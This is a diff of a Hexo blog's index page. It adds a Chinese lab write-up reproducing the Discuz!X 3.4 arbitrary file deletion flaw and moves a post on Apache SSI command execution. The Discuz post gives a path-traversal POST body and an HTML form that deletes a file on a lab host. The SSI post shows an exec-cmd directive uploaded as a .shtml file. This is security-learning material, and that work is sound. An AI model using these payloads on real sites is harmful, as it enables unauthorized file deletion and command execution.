@@ -229,6 +229,143 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (9)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (9)/" itemprop="url">Discuz!X 3.4 前台任意文件删除漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Discuz-X-3-4-前台任意文件删除漏洞复现"><a href="#Discuz-X-3-4-前台任意文件删除漏洞复现" class="headerlink" title="Discuz!X 3.4 前台任意文件删除漏洞复现"></a>Discuz!X 3.4 前台任意文件删除漏洞复现</h1><p>漏洞原理：<br>Discuz!X社区软件1，是一个采用PHP 和MySQL 等其他多种数据库构建的性能优<br>异、功能全面、安全稳定的社区论坛平台。<br>2017年9月29日，Discuz!修复了一个安全问题2用于加强安全性，这个漏洞会导<br>致前台用户可以导致任意删除文件漏洞。<br>2017年9月29日，知道创宇404 实验室开始应急，经过知道创宇404实验室分析<br>确认，该漏洞于2014年6月被提交到Wooyun漏洞平台，Seebug漏洞平台收录了该<br>漏洞3，漏洞编号ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。<br>经过分析确认，原有的利用方式已经被修复，添加了对属性的formtype判断，<br>但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他unlink条<br>件，实现任意文件删除漏洞。<br>访问<a href="http://192.168.199.173/robots.txt" target="_blank" rel="noopener">http://192.168.199.173/robots.txt</a><br><a href="https://imgchr.com/i/mAskes" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAskes.png" alt="mAskes.png"></a><br>首先在网站的根文件夹里新建一个test.txt，用于测试。<br>进入个人设置，可以看到自己的个人资料，在这里摁下F12键。并通过Ctrl+F键<br>找到fromhash值：formhash=b5785099<br>用谷歌浏览器的hankbar插件，添加一条POST请求（将内容里的formhash<br>换为你自己刚才的到的那个）：<br>birthprovince=../../../test.txt&amp;profilesubmit=1&amp;formhash=b5785099<br><a href="https://imgchr.com/i/mAsKlF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsKlF.png" alt="mAsKlF.png"></a><br>修改完之后，点击执行。然后返回到个人资料页面可以发现：<br><a href="https://imgchr.com/i/mAsYY6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAsYY6.png" alt="mAsYY6.png"></a><br>可以看出出生地已经修改为被删除文件的地址，下一步本地创建一个上传点页<br>面，代码如下，注意要修改成自己的formhash值，内容如下：</p>
+<form action="http://192.168.199.173/home.php?mod=spacecp&ac=profile&op=base&deletefile[birthprovince]=aaaaaa" method="POST" enctype="multipart/form-data">
+<input type="file" name="birthprovince" id="file">
+<input type="text" name="formhash" value="b5785099"><p></p>
+<input type="text" name="profilesubmit" value="1"><p></p>
+<input type="submit" value="Submit">
+
+保存为zzz.html到桌面。然后切换到桌面双击进入该文件，可以看到
+[![mAswOH.png](https://s2.ax1x.com/2019/08/15/mAswOH.png)](https://imgchr.com/i/mAswOH)
+随便选一个图片进行上传，上床成功之后，test.txt就会被删除
+[![mAsW6g.png](https://s2.ax1x.com/2019/08/15/mAsW6g.png)](https://imgchr.com/i/mAsW6g)
+
+
+
+
+
+
+</form>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -726,127 +863,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (5)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld (5)/" itemprop="url">Apache SSI 远程命令执行漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>漏洞原理<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。<br>&amp;emsp；<br>先创建一个php文件<br><a href="https://imgchr.com/i/mAP3LT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAP3LT.png" alt="mAP3LT.png"></a><br>然后打开靶机上传文件<br><a href="https://imgchr.com/i/mAPJwF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPJwF.png" alt="mAPJwF.png"></a><br>然后发现不可以<br>正常上传PHP文件是不允许的，我们可以上传一个.shtml文件：<br><a href="https://imgchr.com/i/mAPaWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPaWR.png" alt="mAPaWR.png"></a><br>然后通过bp拦截 把ss.php 后缀改成ss.shtml  go一下<br><a href="https://imgchr.com/i/mAPseO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPseO.png" alt="mAPseO.png"></a><br>然后访问靶机ip/8080/ss.shtml 就可以解析成功<br><a href="https://imgchr.com/i/mAPgFH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPgFH.png" alt="mAPgFH.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (6)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -956,6 +972,127 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld (5)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/ld (5)/" itemprop="url">Apache SSI 远程命令执行漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T09:16:18+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>漏洞原理<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。<br>&amp;emsp；<br>先创建一个php文件<br><a href="https://imgchr.com/i/mAP3LT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAP3LT.png" alt="mAP3LT.png"></a><br>然后打开靶机上传文件<br><a href="https://imgchr.com/i/mAPJwF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPJwF.png" alt="mAPJwF.png"></a><br>然后发现不可以<br>正常上传PHP文件是不允许的，我们可以上传一个.shtml文件：<br><a href="https://imgchr.com/i/mAPaWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPaWR.png" alt="mAPaWR.png"></a><br>然后通过bp拦截 把ss.php 后缀改成ss.shtml  go一下<br><a href="https://imgchr.com/i/mAPseO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPseO.png" alt="mAPseO.png"></a><br>然后访问靶机ip/8080/ss.shtml 就可以解析成功<br><a href="https://imgchr.com/i/mAPgFH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAPgFH.png" alt="mAPgFH.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
   </section>
 
   
@@ -1006,7 +1143,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1019,7 +1156,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
